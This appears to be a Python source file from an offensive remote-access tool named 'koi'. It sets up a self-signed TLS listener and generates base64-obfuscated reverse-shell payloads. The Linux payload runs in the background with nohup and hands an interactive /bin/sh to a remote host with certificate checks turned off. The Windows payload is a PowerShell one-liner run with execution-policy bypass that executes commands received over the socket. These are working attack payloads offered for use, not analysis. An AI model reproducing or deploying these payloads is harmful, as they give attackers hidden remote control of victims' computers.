from __future__ import annotations

import base64
import os
import ssl
import socket
import subprocess
from pathlib import Path
from typing import Optional

_TLS_DIR = Path.home() / ".koi" / "tls"
_CERT_FILE = _TLS_DIR / "koi.pem"
_KEY_FILE = _TLS_DIR / "koi-key.pem"


def _ensure_tls_dir() -> None:
    _TLS_DIR.mkdir(parents=True, exist_ok=True, mode=0o700)


def ensure_cert() -> tuple[Path, Path]:
    if _CERT_FILE.exists() and _KEY_FILE.exists():
        return _CERT_FILE, _KEY_FILE

    _ensure_tls_dir()
    subprocess.run(
        [
            "openssl", "req", "-x509", "-newkey", "ec",
            "-pkeyopt", "ec_paramgen_curve:prime256v1",
            "-keyout", str(_KEY_FILE), "-out", str(_CERT_FILE),
            "-days", "3650", "-nodes",
            "-subj", "/CN=koi",
        ],
        capture_output=True,
        check=True,
    )
    _KEY_FILE.chmod(0o600)
    _CERT_FILE.chmod(0o644)
    return _CERT_FILE, _KEY_FILE


def server_context() -> ssl.SSLContext:
    cert, key = ensure_cert()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(str(cert), str(key))
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    return ctx


def is_tls_client_hello(data: bytes) -> bool:
    return len(data) >= 3 and data[0] == 0x16 and data[1] == 0x03


def try_tls_handshake(
    conn: socket.socket,
    ctx: ssl.SSLContext,
) -> Optional[ssl.SSLSocket]:
    conn.setblocking(True)
    try:
        return ctx.wrap_socket(conn, server_side=True)
    except (ssl.SSLError, OSError):
        return None


# ---------------------------------------------------------------- payloads

def encrypt_payload_linux(host: str, port: int, token: str) -> str:
    script = (
        "import ssl,socket,subprocess,os,select,signal,pty\n"
        "signal.signal(signal.SIGHUP,signal.SIG_IGN)\n"
        f"s=socket.socket(socket.AF_INET6 if ':' in '{host}' else socket.AF_INET)\n"
        f"s.connect(('{host}',{port}))\n"
        "ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n"
        "ctx.check_hostname=False\n"
        "ctx.verify_mode=ssl.CERT_NONE\n"
        "c=ctx.wrap_socket(s)\n"
        f"c.sendall(b'{token}\\n')\n"
        "m,sl=pty.openpty()\n"
        "p=subprocess.Popen(['/bin/sh','-i'],stdin=sl,stdout=sl,stderr=sl,preexec_fn=os.setsid)\n"
        "os.close(sl)\n"
        "try:\n"
        " while p.poll() is None:\n"
        "  r,_,_=select.select([c,m],[],[],1)\n"
        "  if m in r:\n"
        "   d=os.read(m,4096)\n"
        "   if not d:break\n"
        "   c.sendall(d)\n"
        "  if c in r:\n"
        "   d=c.recv(4096)\n"
        "   if not d:break\n"
        "   os.write(m,d)\n"
        "except OSError:pass\n"
    )
    encoded = base64.b64encode(script.encode()).decode()
    return f"nohup python3 -c \"import base64;exec(base64.b64decode('{encoded}'))\" >/dev/null 2>&1 &\n"


def encrypt_payload_windows(host: str, port: int, token: str) -> str:
    inner = (
        f"$c=New-Object Net.Sockets.TcpClient('{host}',{port});"
        f"$s=$c.GetStream();"
        f"$ssl=New-Object Net.Security.SslStream($s,$false,"
        f"({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));"
        f"$ssl.AuthenticateAsClient('{host}');"
        f"$w=New-Object IO.StreamWriter($ssl);$w.AutoFlush=$true;"
        f"$w.WriteLine('{token}');"
        f"$r=New-Object IO.StreamReader($ssl);"
        f"while($c.Connected){{"
        f"$cmd=$r.ReadLine();"
        f"if(!$cmd){{break}}"
        f"$out=cmd /c $cmd 2>&1|Out-String;"
        f"$w.Write($out)}}"
        f"$c.Close()"
    )
    encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
    return f"powershell -nop -ep bypass -enc {encoded}\n"


def encrypt_payload(os_type: str | None, host: str, port: int, token: str) -> str | None:
    if os_type in ("windows_cmd", "windows_ps"):
        return encrypt_payload_windows(host, port, token)
    if os_type == "linux" or os_type is None:
        return encrypt_payload_linux(host, port, token)
    return None
